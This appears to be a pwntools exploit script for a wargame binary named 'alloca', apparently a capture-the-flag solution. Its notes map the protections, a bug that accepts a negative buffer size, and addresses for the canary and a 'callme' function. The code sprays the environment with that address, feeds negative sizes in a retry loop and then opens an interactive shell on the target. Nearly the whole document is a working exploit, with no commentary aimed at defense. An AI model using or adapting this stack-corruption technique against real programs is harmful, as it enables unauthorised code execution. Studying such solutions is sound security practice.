from pwn import *

"""Bugs & Ideas
[Protections]
 - partial RELRO, NX
[Info]
 - esp_m = ((size_input + 34) // 16) * 16
 - buffer = (esp+0xf) >> 4 << 4
 - canary = buffer + size_input
 - check_canary_ebp(ebp_c) = buffer - 0x18
 - canary insert = check_canary_ebp-0x14, check_canary_ebp-0x10
[Bug]
 - buffer size input : not filtering negative number
[Address]
 - buffer_add : 0x804a050 > stack
 - buffer_size : 0x804a048
 - callme : 0x80485ab
 - g_canary : 0x804a04c
 
[Exploit]
 ?? awesome negative integer of size might input my canary(callme) in to stack.
 ebp-0x4 > callme+0x4
"""

callme = p32(0x80485ab)
spray = callme * 30000
e = {str(i): spray for i in range(7)}
while True:
    p = process("/home/alloca/alloca", env=e)
    p.sendline(b"-82")
    p.sendline(b"-4849664")
    p.recvuntil(b"how did you messed this buffer????\n")

    try:
        p.sendline(b"id")
        print("recv: ", p.recv(1024))
        p.interactive()
    except EOFError as e:
        print("error...")
        pass

